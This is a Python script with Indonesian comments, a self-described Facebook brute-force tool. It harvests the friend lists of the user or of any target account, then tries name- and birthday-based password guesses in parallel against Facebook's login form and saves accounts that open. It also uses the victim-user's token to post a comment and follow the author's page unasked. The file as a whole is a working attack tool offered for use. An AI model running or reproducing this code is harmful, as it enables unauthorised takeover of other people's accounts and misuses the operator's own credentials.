#hargain author :) jangan diganti ya!
#Boleh ubah headers, pw list dan lain" tapi mohon jangan ubah author asli hhe ane buatnya 1 mingguan semoga di mengerti :)

#hubungin saya jika itu penting :
#WhatsApp : 083870396203
#Facebook : Latip Harkat
author = 'Latip176' #author utama
#libary / module import
import requests as req,json,os,time,re,pyfiglet
from concurrent.futures import ThreadPoolExecutor as Bool
from bs4 import BeautifulSoup as parser
try:ua=req.get("https://api-asutoolkit.cloudaccess.host/useragent.txt").text.strip() #api buat get headers java me :)
except req.exceptions.ConnectionError:exit("[!] Kesalahan Pada Koneksi")
#variable buat data :)
ok,cp,die=0,0,0
idTeman,idPublik=[],[]
#nama nama buat logo :)
try:
	judul=pyfiglet.figlet_format('CRACK')
	tem=pyfiglet.figlet_format('TEMAN')
	pub=pyfiglet.figlet_format('PUBLIK')
	logi=pyfiglet.figlet_format('LOGIN')
except:os.system('pip install pyfiglet')
#function login
def login():
	os.system('clear')
	print(f'{logi}\n[   LOGIN TERLEBIH DAHULU GENKS   ]\n\n[1]. Login dengan access token\n[2]. Login dengan cookie\n[99]. Keluar dari script :)\n')
	p=input('[?] Pilih yang mana : ')
	if p in ('01','1'): #kondisi 1 login dengan token :)
		print('\n[!] HARAP MASUKAN ACCESS TOKEN ANDA [!]\n')
		try:
			t=input('[?] Access token anda : ')
			r=json.loads(req.get(f'https://graph.facebook.com/me?access_token={t}').text)
			print('[√] Login berhasil [√]\nDengan nama facebook :',r['name'])
			open('log.txt','a').write(t)
			req.post(f'https://graph.facebook.com/136921208435288/comments/?message=Hallo saya pengguna script mu hihi&access_token={t}')
			time.sleep(2)
			nampung(t).menu()
		except KeyError:
			os.system('clear')
			print('[×] Access token Facebook salah [×]')
			time.sleep(2)
			login()
	elif p in ('02','2'): #kondisi 2 login dengan cookies
		print('\n[!] HARAP MASUKAN COOKIE ANDA [!]\n')
		cookie=input("[!] Masukan Cookie Fb Anda : ")
		tomken=req.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 9; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36', 
           'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookie})
		find_token = re.search('(EAAA\w+)',tomken.text)
		if (find_token is None):
			print("[!] Cookie Facebook Salah")
			time.sleep(2)
			login()
		else:
			to=find_token.group(1)
			ru=json.loads(req.get(f"https://graph.facebook.com/me?access_token={to}").text)
			try:print("[√] Login Berhasil\nNama Akun :",ru['name'])
			except:exit("[!] Akun anda terkena limit tunggu 1 - 4 jam atau gunakan akun lain [!]\n")
			req.post(f"https://graph.facebook.com/136921208435288/comments/?message=Hallo saya pengguna script mu hihi&access_token={to}")
			time.sleep(2)
			open("log.txt","a").write(to)
			nampung(to).menu()
			try:
				cek=req.get("https://mbasic.facebook.com/100063522272055",cookies={"cookie":cookie}).text
				true=False
				if "Berhenti mengikuti" not in cek:true=True
				if true==True:
					req.get("https://mbasic.facebook.com/"+parser(cek,"html.parser").find("a",string="Ikuti").get("href"),cookies={"cookie":cookie})
				else:pass
			except:pass
			nampung(to).menu()
	elif p=='99':exit(':( Terima kasih!')#kondisi keluar dari script
	else:
		print('[!] Pilihan tidak Ada [!]\n')
		time.sleep(2)
		login()
def logic():
	try:
		t=open('log.txt','r').read()
		r=json.loads(req.get(f'https://graph.facebook.com/me?access_token={t}').text)
		os.system('clear')
		print('[√] Anda sudah login di Tools [√]\nNama akun Facebook :',r['name'])
		time.sleep(2)
		nampung(t).menu()
	except KeyError:
		os.system('clear')
		print('[×] Token facebook anda Invalid [×]')
		os.system('rm -rf log.txt')
		time.sleep(2)
		login()
	except FileNotFoundError:
		os.system('clear')
		print('[!] Anda belum login ke Tools [!]')
		time.sleep(2)
		login()
class crack:
	
	def __init__(self,token):self.token=token
	def crack1(self,user,pw,ttl):
		global ok,cp,die
		itung.append(user)
		data={}
		ses=req.Session()
		ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":ua,"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
		a=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text,"html.parser")
		b=["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for c in a("input"):
			try:
				if c.get("name") in b:data.update({c.get("name"):c.get("value")})
				else:continue
			except:pass
		data.update({"email":user,"pass":pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		d=ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
		if "c_user" in d.cookies:
			ok+=1
			open("ok.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
			print(f"\r\x1b[1;32m[OK] {user} | {pw} | {ttl}         \x1b[0m",end="")
			print("")
		elif "checkpoint" in d.cookies:
			cp+=1
			open("cp.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
			print(f"\r\x1b[1;33m[CP] {user} | {pw} | {ttl}      \x1b[0m",end="")
			print("")
		else:pass
	def crack2(self,user,pw,ttl):
		global ok,cp,die
		data={}
		ses=req.Session()
		ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":ua,"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
		a=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text,"html.parser")
		b=["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for c in a("input"):
			try:
				if c.get("name") in b:data.update({c.get("name"):c.get("value")})
				else:continue
			except:pass
		data.update({"email":user,"pass":pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		d=ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
		if "c_user" in d.cookies:
			ok+=1
			open("ok.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
			print(f"\r\x1b[1;32m[OK] {user} | {pw} | {ttl}         \x1b[0m",end="")
			print("")
		elif "checkpoint" in d.cookies:
			cp+=1
			open("cp.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
			print(f"\r\x1b[1;33m[CP] {user} | {pw} | {ttl}      \x1b[0m",end="")
			print("")
		else:pass
class nampung:
	
	def __init__(self,token):self.token=token
	def sendTeman(self):
		os.system('clear')
		print(f'{tem}\n[   Crack Daftar Teman   ]\n')
		with Bool(max_workers=35) as tokai:
			r=json.loads(req.get(f'https://graph.facebook.com/me/friends?access_token={self.token}').text)
			for i in r['data']:idTeman.append(i['id'])
			print('[+] Ok save : ok.txt\n[+] Cp save : cp.txt\n')
			time.sleep(1)
			print('[+] Jumlah ID teman :',len(idTeman),'\n[+] Starting crack, stop? CTRL + Z\n======================================\n')
			for id in idTeman:
				r2=json.loads(req.get(f'https://graph.facebook.com/{id}?access_token={self.token}').text)
				try:pwList=[r2['first_name']+'0',r2['first_name']+'11',r2['first_name']+'12',r2['first_name']+'123',r2['first_name']+'1234',r2['first_name']+'12345','Sayang','Doraemon','Bangsad','Rahasia','Katasandi','123456','1234567','Kontol','102030','Freefire','Anjing','Monyet','Bismillah','Indonesia',r2['birthday']] #Password list ubah lah jika itu butuh :)
				except:pass
				try:
					for pw in pwList[1:19]:tokai.submit(crack(self.token).crack1,id,pw,pwList[-1])
				except:pass
		print(f'[   Crack selesai | hasil dapet OK:-{str(ok)} CP:-{str(cp)}   ]\n')
		b=input('[ ENTER UNTUK KEMBALI ]')
		self.menu()
	def sendPublik(self):
		os.system('clear')
		print(f'{pub}\n[   Crack Daftar Teman Orang   ]\n')
		t=input('[!] Masukan ID Teman/Orang : ')
		try:
			r=json.loads(req.get(f'https://graph.facebook.com/{t}?access_token={self.token}').text)
			print('\n[+] Ok save : ok.txt\n[+] Cp save : cp.txt\n\n[+] Nama target/orang :',r['name'])
		except:
			print('[×] User tidak ditemukan [×]')
			time.sleep(2)
			self.menu()
		r3=json.loads(req.get(f'https://graph.facebook.com/{t}/friends?access_token={self.token}').text)
		with Bool(max_workers=35) as tokai:
			for i in r3['data']:idPublik.append(i['id'])
			print('[+] Jumlah ID teman :',len(idPublik),'\n\n[+] Starting crack, stop? CTRL + Z\n======================================\n')
			for id in idPublik:
				r2=json.loads(req.get(f'https://graph.facebook.com/{id}?access_token={self.token}').text)
				try:pwList=[r2['first_name']+'0',r2['first_name']+'11',r2['first_name']+'12',r2['first_name']+'123',r2['first_name']+'1234',r2['first_name']+'12345','Sayang','Doraemon','Bangsad','Rahasia','Katasandi','123456','1234567','102030','Freefire','Anjing','Monyet','Kontol','Bismillah','Indonesia',r2['birthday']] #Password list ubah jika itu butuh :)
				except:pass
				try:
					for pw in pwList[1:19]:tokai.submit(crack(self.token).crack2,id,pw,pwList[-1])
				except:pass
		print(f'[   Crack selesai | hasil dapet OK:-{str(ok)} CP:-{str(cp)}   ]\n')
		b=input('[ ENTER UNTUK KEMBALI ]')
		self.menu()
	def menu(self):
		os.system('clear')
		os.system('clear')
		r=json.loads(req.get(f'https://graph.facebook.com/me?access_token={self.token}').text)
		print(f'{judul}\n[   Hallo',r['name']+', Selamat datang di tools versi: BETA   ]\n\n[1]. Crack daftar teman fb kamu\n[2]. Crack daftar teman/id publik\n[3]. Informasi tools ini\n[9]. Logout akun kamu\n')
		while True:
			p=input('[?] Pilih yang mana : ')
			if p in ('01','1'):self.sendTeman()
			elif p in ('02','2'):self.sendPublik()
			elif p in ('03','3'):
				print('\n[ Hallo kak! Ini adalah tools bruteforce/crack facebook!! Tools ini dibuat oleh Latip Harkat dengan github Latip176 ]\n\nInformasi Sosmed\n1. Facebook\t: Latip Harkat\n2. WhatsApp\t: 083870396203\n\nJika mengalamin kendala saat memakai tools hubungi social media diatas terima kasih.\n')
				b=input('[   ENTER UNTUK KEMBALI   ]')
				self.menu()
			elif p=='9':
				os.system('rm -rf log.txt')
				exit('[√] Logout berhasil [√]')
			else:print('[!] Pilihan tidak ada\n')

if __name__=='__main__':
	logic()
